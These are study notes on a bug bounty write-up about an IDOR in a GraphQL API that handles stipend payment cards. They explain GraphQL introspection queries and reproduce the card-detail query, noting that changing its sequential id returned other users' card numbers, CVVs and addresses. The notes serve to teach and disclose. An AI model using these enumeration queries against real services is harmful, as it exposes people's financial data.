# Writeup - The Million Dollar IDOR

- researcher - [Monish](https://monish-basaniwal.medium.com/)

- Write up can be read [here](https://monish-basaniwal.medium.com/the-million-dollar-hack-8163892bfe2f)

<br>
<br>

## GraphQL

- is an alternative API technique to REST.

- instead of having many endpoints, just has one, like:

```
/graphql
```

- to communicate with functionalities and resources, it used __`queries`__

```graphql
query GetUsers {
  users {
    id
    name
  }
}
```

<br>

#### Restrospection queries

- Just like queries similar to SQL `desc table`, there are queries to describe the SCHEMA and strucure of the graphql service, called as __Restrospection Queries__.

1. Fetch all avaialable queries:

```gql
{
  __schema {
    queryType {
      fields {
        name
      }
    }
  }
}
```


2. Fetch all avaialable mutations:

```gql
{
  __schema {
    mutationType {
      fields {
        name
      }
    }
  }
}
```

- these are generally disabled in production environments.

<br>
<br>

## Methodology

- Right after login, a query for __`getUserStipends`__ was made which basically fetched all the cards which belonged to a specific user, listed out the visa card number, the CVV and the expiry for each card and each card had an id which was guessable and incremental like 45,46,47.

- `getUserStipends` query

```
query getUserStipends {
  myStipends {
    id
    status
    stipend {
      amount
      canAccrue
      colorHex
      colorHex2
      currency
      currentIntervalStart
      emoji
      endDate
      id
      interval
      logoUrl
      name
      nextIntervalStart
      recurrenceStart
      startDate
      createdAt
    }
  }
}
```


- After clicking on a specific card there was yet another request this time for getUserStipend with the id of the specific card I had clicked on:


<br>

```
query getUserStipend($id: Int!) {
  stipendUser(id: $id) {
    activeUserAddressId
    id
    personalCardEnabled
    status
    isTestCard
    redemptionType
    endDate
    endDateExtension
    stipend {
      amount
      canAccrue
      colorHex
      colorHex2
      company {
        id
        allowParticipantBillingAddress
        allowParticipantPersonalCC
      }
      currency
      currentIntervalStart
      emoji
      endDate
      id
      interval
      logoUrl
      name
      nextIntervalStart
      recurrenceStart
      startDate
      createdAt
      address {
        city
        country
        id
        line1
        line2
        phone_number
        postal_code
        state
      }
      merchantCategory {
        categoryId
        categoryName
        merchantId
        merchantName
        url
        logoUrl
        networkId
      }
    }
    userAddresses {
      city
      country
      id
      line1
      line2
      phone_number
      postal_code
      state
    }
    card {
      stripeCardId
      currentBalance
      accruedBalance
      number
      cvc
      expiry
      status
      donated
      categories {
        displayTitle
        title
      }
      cardholder {
        name
        address {
          city
          country
          line1
          line2
          postal_code
          state
        }
      }
    }
    reimbursement {
      history {
        status
        occurredAt
      }
      amount
      targetCurrency
      totalFee
      wiseQuoteId
      wiseRecipientId
      wiseTransferId
    }
  }
}

{
    "id": 100000
}
```

<br>


#### Easy IDOR

- __specific card query__ : This query, in turn, returned more in-depth data about the specific card, the amount which was available the currency and so on,


- after chaning the `ID` parameter to next sequence, it was extracting data. Hence the IDOR worked!

<br>

![ack](https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1i45eUjqhYEfLvim.png)
